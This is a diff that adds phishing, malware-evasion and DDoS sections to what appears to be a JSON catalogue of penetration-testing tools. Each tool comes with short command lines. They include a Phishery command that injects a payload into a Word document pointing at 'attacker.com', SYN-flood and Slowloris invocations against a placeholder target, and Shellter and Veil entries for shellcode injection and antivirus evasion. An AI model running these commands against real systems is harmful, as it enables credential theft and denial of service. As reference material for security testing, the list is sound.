@@ -1728,5 +1728,249 @@
                         }
                     ]
                 }
+            ],
+            "Social Engineering & Phishing": [
+        {
+            "name": "Gophish",
+            "description": "Open-source phishing framework for creating and tracking phishing campaigns.",
+            "commands": [
+                {
+                    "command": "gophish",
+                    "explanation": "Start the Gophish server"
+                },
+                {
+                    "command": "./gophish admin",
+                    "explanation": "Launch the admin interface"
+                },
+                {
+                    "command": "gophish --config config.json",
+                    "explanation": "Start Gophish with a custom configuration"
+                }
             ]
+        },
+        {
+            "name": "King Phisher",
+            "description": "Flexible phishing campaign toolkit for testing and training.",
+            "commands": [
+                {
+                    "command": "king-phisher",
+                    "explanation": "Start King Phisher client"
+                },
+                {
+                    "command": "king-phisher --server",
+                    "explanation": "Start King Phisher server"
+                },
+                {
+                    "command": "king-phisher --help",
+                    "explanation": "Display help and options"
+                }
+            ]
+        },
+        {
+            "name": "Social-Engineer Toolkit (SET)",
+            "description": "Framework designed for social engineering attacks, including phishing, credential harvesting, and payload delivery.",
+            "commands": [
+                {
+                    "command": "setoolkit",
+                    "explanation": "Launch the SET main menu"
+                },
+                {
+                    "command": "setoolkit --update",
+                    "explanation": "Update SET to the latest version"
+                },
+                {
+                    "command": "setoolkit --help",
+                    "explanation": "Display help menu"
+                }
+            ]
+        },
+        {
+            "name": "Evilginx2",
+            "description": "Man-in-the-middle attack framework used for phishing login credentials and session cookies.",
+            "commands": [
+                {
+                    "command": "./evilginx",
+                    "explanation": "Start the Evilginx2 server"
+                },
+                {
+                    "command": "phishlets hostname <name> <domain>",
+                    "explanation": "Configure hostname for a phishlet"
+                },
+                {
+                    "command": "phishlets enable <name>",
+                    "explanation": "Enable a specific phishlet"
+                }
+            ]
+        },
+        {
+            "name": "Phishery",
+            "description": "Phishing tool for delivering payloads via Word documents.",
+            "commands": [
+                {
+                    "command": "phishery -i template.docx -o payload.docx -u http://attacker.com/",
+                    "explanation": "Inject payload into Word document"
+                },
+                {
+                    "command": "phishery -h",
+                    "explanation": "Show help and options"
+                }
+            ]
+        },
+        {
+            "name": "CredSniper",
+            "description": "Phishing framework for capturing credentials and bypassing 2FA.",
+            "commands": [
+                {
+                    "command": "python3 creds.py",
+                    "explanation": "Start CredSniper"
+                },
+                {
+                    "command": "python3 creds.py --config config.yml",
+                    "explanation": "Start with specific configuration"
+                }
+            ]
+        }
+    ],
+    "Malware Analysis & Evasion": [
+        {
+            "name": "Cuckoo Sandbox",
+            "description": "Automated malware analysis system for dynamic analysis of suspicious files.",
+            "commands": [
+                {
+                    "command": "cuckoo",
+                    "explanation": "Start Cuckoo Sandbox"
+                },
+                {
+                    "command": "cuckoo submit <file>",
+                    "explanation": "Submit a file for analysis"
+                },
+                {
+                    "command": "cuckoo web",
+                    "explanation": "Start Cuckoo web interface"
+                }
+            ]
+        },
+        {
+            "name": "PEStudio",
+            "description": "Windows tool for static analysis of executable files.",
+            "commands": [
+                {
+                    "command": "pestudio.exe <file>",
+                    "explanation": "Analyze a PE file"
+                }
+            ]
+        },
+        {
+            "name": "Shellter",
+            "description": "Dynamic shellcode injection tool for Windows PE files.",
+            "commands": [
+                {
+                    "command": "wine Shellter.exe",
+                    "explanation": "Run Shellter in Wine"
+                },
+                {
+                    "command": "Shellter.exe -a -f <file.exe>",
+                    "explanation": "Inject shellcode automatically"
+                }
+            ]
+        },
+        {
+            "name": "Veil-Evasion",
+            "description": "Framework for generating AV-evading payloads.",
+            "commands": [
+                {
+                    "command": "veil",
+                    "explanation": "Start Veil framework"
+                },
+                {
+                    "command": "./Veil.py --list",
+                    "explanation": "List available payloads"
+                }
+            ]
+        },
+        {
+            "name": "UnpacMe",
+            "description": "Online service and CLI for unpacking and analyzing malware samples.",
+            "commands": [
+                {
+                    "command": "unpacme submit <file>",
+                    "explanation": "Submit file for unpacking"
+                }
+            ]
+        },
+        {
+            "name": "FLOSS",
+            "description": "Tool to automatically extract obfuscated strings from malware binaries.",
+            "commands": [
+                {
+                    "command": "floss <file>",
+                    "explanation": "Extract and deobfuscate strings"
+                }
+            ]
+        }
+    ],
+    "DDoS Testing": [
+        {
+            "name": "LOIC",
+            "description": "Low Orbit Ion Cannon, an open source stress testing and DDoS attack tool.",
+            "commands": [
+                {
+                    "command": "mono LOIC.exe",
+                    "explanation": "Run LOIC (on Linux with Mono)"
+                }
+            ]
+        },
+        {
+            "name": "HOIC",
+            "description": "High Orbit Ion Cannon, an advanced DDoS tool for launching multiple attacks.",
+            "commands": [
+                {
+                    "command": "mono HOIC.exe",
+                    "explanation": "Run HOIC (on Linux with Mono)"
+                }
+            ]
+        },
+        {
+            "name": "Slowloris",
+            "description": "DoS tool that holds connections open by sending partial HTTP requests.",
+            "commands": [
+                {
+                    "command": "slowloris <target> -p 80 -s 400",
+                    "explanation": "Attack target with 400 sockets on port 80"
+                }
+            ]
+        },
+        {
+            "name": "Hping3",
+            "description": "Network tool able to send custom TCP/IP packets for DDoS simulation.",
+            "commands": [
+                {
+                    "command": "hping3 --flood -S -p 80 <target>",
+                    "explanation": "SYN flood attack on port 80"
+                }
+            ]
+        },
+        {
+            "name": "GoldenEye",
+            "description": "HTTP DoS test tool for stress-testing web servers.",
+            "commands": [
+                {
+                    "command": "python3 goldeneye.py http://<target> -w 64 -s 512",
+                    "explanation": "DDoS attack with 64 workers and 512 sockets"
+                }
+            ]
+        },
+        {
+            "name": "XERXES",
+            "description": "Simple, raw, multi-threaded DDoS tool.",
+            "commands": [
+                {
+                    "command": "./xerxes <target> <port>",
+                    "explanation": "Run attack against specified target and port"
+                }
+            ]
+        }
+    ]
 }
+
+
